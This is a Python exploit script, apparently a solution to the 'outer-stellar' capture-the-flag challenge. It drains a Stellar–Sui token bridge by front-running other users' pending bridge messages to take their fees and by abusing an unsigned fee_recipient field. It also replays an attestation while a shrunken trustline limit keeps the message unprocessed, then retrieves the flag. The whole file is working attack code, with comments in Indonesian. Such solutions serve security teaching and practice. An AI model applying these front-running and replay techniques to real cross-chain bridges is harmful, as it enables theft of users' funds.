#!/usr/bin/env python3
import json, os, re, shutil, subprocess, sys, tempfile, threading, time
from pathlib import Path
import requests

BASE = (
    sys.argv[1]
    if len(sys.argv) > 1
    else os.getenv("URL", "")
).rstrip("/")

if not BASE:
    raise SystemExit(
        f"usage: {sys.argv[0]} "
        "https://outer-stellar-....instancer.sekai.team"
    )

TARGET = int(os.getenv("TARGET_STOLEN", "52"))
GAS = "100000000"
HTTP = requests.Session()

WORK = Path(
    tempfile.mkdtemp(prefix="outer-stellar-")
)
STELLAR_CFG = WORK / "stellar"
SUI_KEYSTORE = WORK / "sui.keystore"
SUI_HOME = WORK / "home"
SUI_CONFIG = (
    SUI_HOME
    / ".sui"
    / "sui_config"
    / "client.yaml"
)

STELLAR_CFG.mkdir()
SUI_CONFIG.parent.mkdir(parents=True)

stellar_lock = threading.RLock()


def url(path):
    if path.startswith("http"):
        return path

    return BASE + (
        path
        if path.startswith("/")
        else "/" + path
    )


def run(command, timeout=240, env=None):
    process = subprocess.run(
        command,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=timeout,
        env=env,
    )

    if process.returncode:
        output = (
            process.stdout
            + "\n"
            + process.stderr
        ).strip()

        raise RuntimeError(
            output[-5000:]
        )

    return process.stdout.strip()


def get_info():
    deadline = time.time() + 300

    while time.time() < deadline:
        try:
            data = HTTP.get(
                url("/info"),
                timeout=20,
            ).json()

            if (
                data.get("running")
                and data.get("bridge")
            ):
                return data

            print(
                "[*] waiting:",
                data.get("message")
                or data.get("error"),
                flush=True,
            )

        except Exception as error:
            print(
                "[*] waiting:",
                error,
                flush=True,
            )

        time.sleep(2)

    raise TimeoutError(
        "instance not ready"
    )


INFO = get_info()
STELLAR = INFO["node_info"]["stellar"]
SUI = INFO["node_info"]["sui"]
BRIDGE = INFO["bridge"]

STELLAR_RPC = url(STELLAR["endpoint"])
SUI_RPC = url(SUI["endpoint"])

PENDING_ENDPOINT = url(
    f"/stellar/{STELLAR['uuid']}"
    "/pending_transactions"
)

SUI_ATTESTATIONS = url(
    SUI["attestations_endpoint"]
)

STELLAR_SECRET = STELLAR["player_secret"]
STELLAR_PUBLIC = STELLAR["player_public"]
ISSUER = STELLAR["sekai_issuer"]
NETWORK = STELLAR["network_passphrase"]

SUI_SECRET = SUI["player_secret"]
SUI_ADDRESS = SUI["player_address"]

PACKAGE = BRIDGE["sui_package_id"]
BRIDGE_OBJECT = BRIDGE[
    "sui_bridge_object_id"
]
STELLAR_CONTRACT = BRIDGE[
    "stellar_contract_id"
]

COIN_TYPE = (
    f"{PACKAGE}::sekai::SEKAI"
)

print(
    "[+] Stellar:",
    STELLAR_PUBLIC,
)
print(
    "[+] Sui:",
    SUI_ADDRESS,
)
print(
    "[+] temp:",
    WORK,
)


# ============================================================
# Stellar
# ============================================================

def stellar_base():
    return [
        "--config-dir",
        str(STELLAR_CFG),

        "--network-passphrase",
        NETWORK,

        "--rpc-url",
        STELLAR_RPC,

        "--source-account",
        STELLAR_SECRET,
    ]


def stellar_invoke(
    function,
    arguments,
    send=True,
):
    command = [
        "stellar",
        "contract",
        "invoke",
        *stellar_base(),

        "--instruction-leeway",
        "10000000",

        "--id",
        STELLAR_CONTRACT,
    ]

    if not send:
        command += [
            "--send",
            "no",
        ]

    command += [
        "--",
        function,
        *arguments,
    ]

    with stellar_lock:
        return run(
            command,
            timeout=180,
        )


def change_trust(limit=None):
    command = [
        "stellar",
        "tx",
        "new",
        "change-trust",
        *stellar_base(),

        "--line",
        f"SEKAI:{ISSUER}",
    ]

    if limit is not None:
        command += [
            "--limit",
            str(limit),
        ]

    with stellar_lock:
        run(
            command,
            timeout=180,
        )


def stellar_balance():
    output = stellar_invoke(
        "balance",
        [
            "--owner",
            STELLAR_PUBLIC,
        ],
        send=False,
    )

    match = re.search(
        r"-?\d+",
        output,
    )

    if not match:
        raise RuntimeError(
            f"bad balance output: {output}"
        )

    return int(match.group())



def stellar_received():
    output = stellar_invoke(
        "received",
        [
            "--recipient",
            STELLAR_PUBLIC,
        ],
        send=False,
    )

    match = re.search(r"-?\d+", output)

    if not match:
        raise RuntimeError(
            f"bad received output: {output!r}"
        )

    return int(match.group())


def raw_asset_amount(raw):
    sign = "-" if raw < 0 else ""
    raw = abs(int(raw))
    whole, fraction = divmod(
        raw,
        10_000_000,
    )

    return (
        f"{sign}{whole}."
        f"{fraction:07d}"
    )


def set_trust_limit_raw(raw):
    print(
        "[*] setting trustline limit to "
        f"{raw_asset_amount(raw)} "
        f"(raw={raw})",
        flush=True,
    )

    change_trust(
        raw_asset_amount(raw)
    )

def stellar_claim():
    deadline = time.time() + 240
    last_error = None

    while time.time() < deadline:
        # Claim mungkin sudah commit walaupun CLI timeout.
        try:
            balance = stellar_balance()

            if balance >= 100:
                print(
                    "[+] Stellar claim already present; "
                    f"balance={balance}",
                    flush=True,
                )
                return

        except Exception as error:
            last_error = error

        try:
            stellar_invoke(
                "claim",
                [
                    "--claimant",
                    STELLAR_PUBLIC,
                ],
            )

            print(
                "[+] Stellar claim submitted",
                flush=True,
            )
            return

        except Exception as error:
            last_error = error
            text = str(error)
            lower = text.lower()

            # Contract error #8 = AlreadyClaimed.
            if (
                "alreadyclaimed" in lower
                or "contract, #8" in lower
                or "error(contract, #8)" in lower
            ):
                print(
                    "[+] Stellar already claimed",
                    flush=True,
                )
                return

            transient = any(
                marker in lower
                for marker in (
                    "request timeout",
                    "timed out",
                    "timeout",
                    "connection refused",
                    "connection reset",
                    "could not query captive core",
                    "internalerror",
                    "http request failed",
                    "502",
                    "503",
                )
            )

            if not transient:
                raise

            print(
                "[-] Stellar claim RPC transient; "
                "retrying in 2s:",
                text.splitlines()[-1],
                flush=True,
            )
            time.sleep(2)

    raise TimeoutError(
        f"Stellar claim did not settle: {last_error}"
    )


def stellar_deposit(amount):
    stellar_invoke(
        "deposit_to_sui",
        [
            "--from",
            STELLAR_PUBLIC,

            "--sui_recipient",
            SUI_ADDRESS,

            "--amount",
            str(amount),
        ],
    )


def stellar_complete(item):
    stellar_invoke(
        "complete_from_sui",
        [
            "--recipient",
            str(item["recipient"]),

            "--amount",
            str(item["amount"]),

            "--message_id",
            str(
                item["message_id"]
            ).removeprefix("0x"),

            "--attestation",
            str(
                item["attestation"]
            ).removeprefix("0x"),

            "--fee_recipient",
            STELLAR_PUBLIC,
        ],
    )


# ============================================================
# Sui JSON-RPC and offline signing
# ============================================================

def setup_sui():
    config = "\n".join(
        [
            "---",
            "keystore:",
            f"  File: {SUI_KEYSTORE}",
            "envs:",
            "  - alias: remote",
            f'    rpc: "{SUI_RPC}"',
            "    ws: ~",
            "    basic_auth: ~",
            "active_env: remote",
            f'active_address: "{SUI_ADDRESS}"',
            "",
        ]
    )

    SUI_CONFIG.write_text(config)

    environment = {
        **os.environ,
        "HOME": str(SUI_HOME),
    }

    process = subprocess.run(
        [
            "sui",
            "keytool",
            "--keystore-path",
            str(SUI_KEYSTORE),
            "--json",
            "import",
            SUI_SECRET,
            "ed25519",
            "--alias",
            "player",
        ],
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=120,
        env=environment,
    )

    combined = (
        process.stdout
        + process.stderr
    )

    if (
        process.returncode
        and "already" not in combined.lower()
    ):
        raise RuntimeError(
            combined
        )


def rpc(method, parameters, timeout=30):
    response = HTTP.post(
        SUI_RPC,
        json={
            "jsonrpc": "2.0",
            "id": 1,
            "method": method,
            "params": parameters,
        },
        headers={
            "Connection": "close",
        },
        timeout=timeout,
    )

    response.raise_for_status()
    data = response.json()

    if "error" in data:
        raise RuntimeError(
            data["error"]
        )

    return data["result"]


def wait_sui_ready(timeout=300):
    deadline = time.time() + timeout

    while time.time() < deadline:
        try:
            package = rpc(
                "sui_getObject",
                [
                    PACKAGE,
                    {
                        "showType": True,
                    },
                ],
                timeout=10,
            )

            bridge = rpc(
                "sui_getObject",
                [
                    BRIDGE_OBJECT,
                    {
                        "showType": True,
                    },
                ],
                timeout=10,
            )

            if (
                isinstance(
                    package.get("data"),
                    dict,
                )
                and isinstance(
                    bridge.get("data"),
                    dict,
                )
            ):
                return

        except Exception:
            pass

        time.sleep(1)

    raise TimeoutError(
        "Sui did not recover"
    )


def rpc_retry(
    method,
    parameters,
    timeout=300,
):
    deadline = time.time() + timeout
    last_error = None

    while time.time() < deadline:
        try:
            return rpc(
                method,
                parameters,
                timeout=30,
            )

        except Exception as error:
            last_error = error
            time.sleep(1)

    raise TimeoutError(
        f"{method}: {last_error}"
    )


def sign_transaction(tx_bytes):
    environment = {
        **os.environ,
        "HOME": str(SUI_HOME),
    }

    output = run(
        [
            "sui",
            "keytool",
            "--keystore-path",
            str(SUI_KEYSTORE),
            "--json",
            "sign",
            "--address",
            SUI_ADDRESS,
            "--data",
            tx_bytes,
        ],
        timeout=120,
        env=environment,
    )

    data = json.loads(
        output[output.find("{"):]
    )

    signature = (
        data.get("suiSignature")
        or data["sui_signature"]
    )

    return signature


def execute_transaction(tx_bytes):
    signature = sign_transaction(
        tx_bytes
    )

    # Jangan retry request execute secara buta.
    # Transaksi bisa sudah commit lalu gateway
    # sedang melakukan checkpoint.
    result = rpc(
        "sui_executeTransactionBlock",
        [
            tx_bytes,
            [signature],
            {
                "showInput": True,
                "showEffects": True,
                "showEvents": True,
                "showObjectChanges": True,
                "showBalanceChanges": True,
            },
            "WaitForLocalExecution",
        ],
        timeout=900,
    )

    status = (
        result
        .get("effects", {})
        .get("status", {})
        .get("status")
    )

    if status not in (
        None,
        "success",
    ):
        raise RuntimeError(
            json.dumps(result)[:4000]
        )

    return result


def build_execute(
    method,
    parameters,
):
    wait_sui_ready()

    built = rpc_retry(
        method,
        parameters,
    )

    return execute_transaction(
        built["txBytes"]
    )


def move_call(function, arguments):
    return build_execute(
        "unsafe_moveCall",
        [
            SUI_ADDRESS,
            PACKAGE,
            "bridge",
            function,
            [],
            [
                BRIDGE_OBJECT,
                *arguments,
            ],
            None,
            GAS,
        ],
    )


def sui_claim():
    move_call(
        "claim",
        [],
    )


def sui_complete(item):
    move_call(
        "complete_from_stellar",
        [
            str(item["recipient"]),
            str(item["amount"]),
            str(item["message_id"]),
            "0x"
            + str(
                item["attestation"]
            ).removeprefix("0x"),
            SUI_ADDRESS,
        ],
    )


def sui_deposit(coin_id):
    move_call(
        "deposit_to_stellar",
        [
            coin_id,
            STELLAR_PUBLIC,
        ],
    )


def sui_coins():
    result = rpc_retry(
        "suix_getCoins",
        [
            SUI_ADDRESS,
            COIN_TYPE,
            None,
            100,
        ],
        timeout=180,
    )

    return result.get(
        "data",
        [],
    )


def sui_balance():
    return sum(
        int(coin["balance"])
        for coin in sui_coins()
    )


def created_coin(result, amount=None):
    ids = [
        change["objectId"]
        for change
        in result.get(
            "objectChanges",
            [],
        )
        if (
            change.get("type")
            == "created"
            and "::coin::Coin<"
            in change.get(
                "objectType",
                "",
            )
        )
    ]

    if not ids:
        raise RuntimeError(
            "no created coin"
        )

    if amount is None:
        return ids[-1]

    balances = {
        coin["coinObjectId"]:
        int(coin["balance"])
        for coin in sui_coins()
    }

    return next(
        (
            object_id
            for object_id in ids
            if balances.get(object_id)
            == amount
        ),
        ids[-1],
    )


def split_coin(coin_id, amount):
    result = build_execute(
        "unsafe_splitCoin",
        [
            SUI_ADDRESS,
            coin_id,
            [
                str(amount),
            ],
            None,
            GAS,
        ],
    )

    return created_coin(
        result,
        amount,
    )


def merge_all():
    coins = sui_coins()

    primary = max(
        coins,
        key=lambda coin:
        int(coin["balance"]),
    )["coinObjectId"]

    for coin in coins:
        other = coin["coinObjectId"]

        if other == primary:
            continue

        build_execute(
            "unsafe_mergeCoins",
            [
                SUI_ADDRESS,
                primary,
                other,
                None,
                GAS,
            ],
        )

    entry = next(
        coin
        for coin in sui_coins()
        if coin["coinObjectId"]
        == primary
    )

    return (
        primary,
        int(entry["balance"]),
    )


def one_coin():
    coins = sorted(
        sui_coins(),
        key=lambda coin:
        int(coin["balance"]),
    )

    exact = next(
        (
            coin
            for coin in coins
            if int(coin["balance"]) == 1
        ),
        None,
    )

    if exact:
        return exact["coinObjectId"]

    largest = max(
        coins,
        key=lambda coin:
        int(coin["balance"]),
    )

    return split_coin(
        largest["coinObjectId"],
        1,
    )


# ============================================================
# Public attestation and pending endpoints
# ============================================================

def pending_transactions():
    try:
        return HTTP.get(
            PENDING_ENDPOINT,
            timeout=15,
        ).json().get(
            "pending_transactions",
            [],
        )

    except Exception:
        return []


def attestations(endpoint):
    try:
        return HTTP.get(
            endpoint,
            timeout=15,
        ).json().get(
            "attestations",
            [],
        )

    except Exception:
        return []


def wait_pending(
    recipient,
    amount,
    used,
    timeout=180,
):
    deadline = time.time() + timeout

    while time.time() < deadline:
        for item in pending_transactions():
            message_id = str(
                item.get("message_id")
            )

            if message_id in used:
                continue

            if (
                str(item.get("recipient"))
                == recipient
                and int(
                    item.get("amount", -1)
                )
                == amount
            ):
                used.add(message_id)
                return item

        time.sleep(0.2)

    raise TimeoutError(
        f"pending {amount} not found"
    )


def wait_sui_attestation(
    recipient=None,
    honest=None,
    amount=None,
    status=None,
    after=0,
    used=None,
    timeout=180,
):
    used = (
        used
        if used is not None
        else set()
    )

    deadline = time.time() + timeout

    while time.time() < deadline:
        items = attestations(
            SUI_ATTESTATIONS
        )

        for item in reversed(items):
            message_id = str(
                item.get("message_id")
            )

            if (
                not message_id
                or message_id in used
                or float(
                    item.get(
                        "created_at",
                        0,
                    )
                ) < after
            ):
                continue

            if (
                recipient is not None
                and str(
                    item.get("recipient")
                ) != recipient
            ):
                continue

            if honest is not None:
                is_honest = (
                    str(
                        item.get("recipient")
                    )
                    != SUI_ADDRESS
                )

                if is_honest != honest:
                    continue

            if (
                amount is not None
                and int(
                    item.get("amount", -1)
                ) != amount
            ):
                continue

            if (
                status is not None
                and item.get("status")
                != status
            ):
                continue

            used.add(message_id)
            return item

        time.sleep(0.5)

    raise TimeoutError(
        "Sui attestation not found"
    )


def wait_pending_gone(
    message_ids,
    timeout=90,
):
    deadline = time.time() + timeout

    while time.time() < deadline:
        current = {
            str(item.get("message_id"))
            for item
            in pending_transactions()
        }

        if message_ids.isdisjoint(
            current
        ):
            return

        time.sleep(0.5)

    raise TimeoutError(
        "pending transactions not cleared"
    )


# ============================================================
# Stellar mempool front-runner
# ============================================================

class FrontRunner:
    def __init__(self):
        self.stop_event = (
            threading.Event()
        )

        self.thread = threading.Thread(
            target=self.loop,
            daemon=True,
        )

        self.done = set()
        self.stolen = 0
        self.count = 0
        self.condition = (
            threading.Condition()
        )

    def start(self):
        self.thread.start()

    def stop(self):
        self.stop_event.set()
        self.thread.join(30)

    def wait(self, count, timeout=300):
        deadline = time.time() + timeout

        with self.condition:
            while (
                self.count < count
                and time.time() < deadline
            ):
                self.condition.wait(1)

            return self.count >= count

    def loop(self):
        while not self.stop_event.is_set():
            live = pending_transactions()

            live_ids = {
                str(
                    item.get("message_id")
                )
                for item in live
            }

            for item in live:
                message_id = str(
                    item.get("message_id")
                )

                if (
                    not message_id
                    or message_id in self.done
                    or str(
                        item.get("recipient")
                    ) == STELLAR_PUBLIC
                ):
                    continue

                try:
                    stellar_complete(item)

                    fee = (
                        int(item["amount"])
                        // 8
                    )

                    self.done.add(
                        message_id
                    )

                    with self.condition:
                        self.stolen += fee
                        self.count += 1

                        print(
                            "[+] stole Stellar "
                            f"fee={fee}, "
                            f"total={self.stolen}, "
                            f"amount={item['amount']}",
                            flush=True,
                        )

                        self.condition.notify_all()

                except Exception as error:
                    text = str(error)

                    if (
                        "MessageAlreadyProcessed"
                        in text
                        or "Contract, #7"
                        in text
                        or message_id
                        not in live_ids
                    ):
                        self.done.add(
                            message_id
                        )

                    else:
                        print(
                            "[-] front-run retry:",
                            text.splitlines()[-1],
                            flush=True,
                        )

            self.stop_event.wait(0.15)


# ============================================================
# Exploit
# ============================================================

def main():
    for binary in (
        "stellar",
        "sui",
    ):
        if not shutil.which(binary):
            raise SystemExit(
                "missing " + binary
            )

    setup_sui()
    wait_sui_ready()

    print("[*] creating trustline")
    change_trust()

    # Aktifkan sniper sebelum claim agar pending honest
    # tidak terlewat ketika Stellar RPC sedang lambat.
    front_runner = FrontRunner()
    front_runner.start()

    print("[*] claiming Stellar")
    stellar_claim()

    # Tunggu satu putaran normal. Pending pertama menjadi
    # penanda bahwa honest player baru menerima Stellar lagi.
    print(
        "[*] waiting first honest "
        "pending transaction"
    )

    if not front_runner.wait(1):
        raise RuntimeError(
            "no honest pending"
        )

    # Honest sekarang segera mengirim Stellar ke Sui lagi.
    # Relayer polling maksimal 10 detik lalu delay 20 detik.
    print(
        "[*] wait 12s then Sui claim"
    )

    time.sleep(22)
    claim_time = time.time()

    print(
        "[*] claiming Sui and "
        "forcing checkpoint"
    )

    sui_claim()

    failed_honest = None

    try:
        failed_honest = (
            wait_sui_attestation(
                honest=True,
                status="failed",
                after=claim_time - 10,
                timeout=120,
            )
        )

    except TimeoutError:
        print(
            "[-] checkpoint claim meleset; "
            "menggunakan checkpoint fallback",
            flush=True,
        )

    # Jika claim pertama meleset, setiap pending Stellar
    # milik honest menandakan honest baru menerima token lalu
    # akan segera melakukan Stellar -> Sui lagi.
    for attempt in range(1, 4):
        if failed_honest is not None:
            break

        target_count = (
            front_runner.count + 1
        )

        print(
            "[*] waiting next honest cycle "
            f"for fallback {attempt}/3",
            flush=True,
        )

        if not front_runner.wait(
            target_count,
            timeout=240,
        ):
            continue

        # Deposit Stellar honest memerlukan beberapa detik,
        # lalu relayer polling maksimal 10 detik.
        time.sleep(22)

        checkpoint_time = time.time()

        print(
            "[*] fallback checkpoint "
            f"{attempt}/3",
            flush=True,
        )

        # Deposit 1 token menghasilkan checkpoint.
        # Token tersebut nanti kembali ke Stellar, jadi
        # tidak benar-benar hilang.
        sui_deposit(
            one_coin()
        )

        try:
            failed_honest = (
                wait_sui_attestation(
                    honest=True,
                    status="failed",
                    after=checkpoint_time - 10,
                    timeout=120,
                )
            )

        except TimeoutError:
            pass

    if failed_honest is None:
        raise RuntimeError(
            "tidak berhasil membuat honest "
            "Sui completion gagal; reset instance"
        )

    sui_fee = (
        int(failed_honest["amount"])
        // 8
    )

    print(
        "[+] failed honest "
        f"amount={failed_honest['amount']} "
        f"fee={sui_fee}"
    )

    # fee_recipient tidak ditandatangani.
    sui_complete(failed_honest)

    while (
        front_runner.stolen
        + sui_fee
        < TARGET
    ):
        print(
            "[*] stolen "
            f"{front_runner.stolen + sui_fee}"
            f"/{TARGET}",
            flush=True,
        )

        time.sleep(3)

    front_runner.stop()

    print(
        "[+] enough stolen:",
        front_runner.stolen + sui_fee,
    )

    # ========================================================
    # Final: pindahkan saldo Sui ke Stellar tanpa perlu
    # mengosongkan saldo Stellar yang sudah kita miliki.
    #
    # Kita mempersempit trustline ke balance sekarang.
    # Transfer recipient kemudian gagal dan memicu
    # ReleaseBuffer, tetapi message_id belum processed.
    # ========================================================

    front_runner.stop()

    stellar_now = stellar_balance()
    sui_now = sui_balance()
    received_now = stellar_received()

    print(
        "[+] before final stage: "
        f"Stellar={stellar_now}, "
        f"Sui={sui_now}, "
        f"received={received_now}, "
        f"total={stellar_now + sui_now}",
        flush=True,
    )

    if stellar_now + sui_now < 250:
        raise RuntimeError(
            "total token belum mencapai 250"
        )

    primary, sui_total = merge_all()

    # Setelah chunk kecil diproses, buffer yang tersisa
    # harus cukup agar chunk besar melewati receive cap.
    large_amount = 100 - received_now
    small_amount = (
        sui_total - large_amount
    )

    if not (
        0 < small_amount <= 100
        and 0 < large_amount <= 100
    ):
        raise RuntimeError(
            "ukuran chunk final tidak valid: "
            f"small={small_amount}, "
            f"large={large_amount}, "
            f"sui_total={sui_total}, "
            f"received={received_now}"
        )

    small_coin = split_coin(
        primary,
        small_amount,
    )
    large_coin = primary

    print(
        "[*] final Sui chunks: "
        f"small={small_amount}, "
        f"large={large_amount}",
        flush=True,
    )

    # Limit sama dengan saldo saat ini, sehingga tidak ada
    # ruang bagi transfer token baru.
    set_trust_limit_raw(
        stellar_now
    )

    used_pending = set()

    # Deposit chunk kecil dan ambil attestation dari mempool.
    print(
        "[*] depositing small chunk",
        flush=True,
    )
    sui_deposit(small_coin)

    small_item = wait_pending(
        STELLAR_PUBLIC,
        small_amount,
        used_pending,
        timeout=240,
    )

    # Replay dua kali saat trustline penuh:
    # buffer = 2 * small_amount.
    # Message tetap belum processed.
    stellar_complete(small_item)
    print(
        "[+] small buffer replay 1/2",
        flush=True,
    )

    stellar_complete(small_item)
    print(
        "[+] small buffer replay 2/2",
        flush=True,
    )

    # Deposit chunk besar sesudah buffer sudah siap.
    print(
        "[*] depositing large chunk",
        flush=True,
    )
    sui_deposit(large_coin)

    large_item = wait_pending(
        STELLAR_PUBLIC,
        large_amount,
        used_pending,
        timeout=240,
    )

    # Pulihkan limit maksimum.
    print(
        "[*] restoring normal trustline limit",
        flush=True,
    )
    change_trust()

    # Chunk besar diproses dahulu agar mengalahkan relayer
    # yang masih berada dalam mempool delay 15 detik.
    stellar_complete(large_item)
    print(
        "[+] released large chunk",
        flush=True,
    )

    stellar_complete(small_item)
    print(
        "[+] released small chunk",
        flush=True,
    )

    final_balance = stellar_balance()

    print(
        "[+] final Stellar balance:",
        final_balance,
        flush=True,
    )

    response = HTTP.get(
        url("/flag"),
        timeout=30,
    )

    print(response.text)

if __name__ == "__main__":
    try:
        main()

    finally:
        print(
            "[*] temp:",
            WORK,
        )
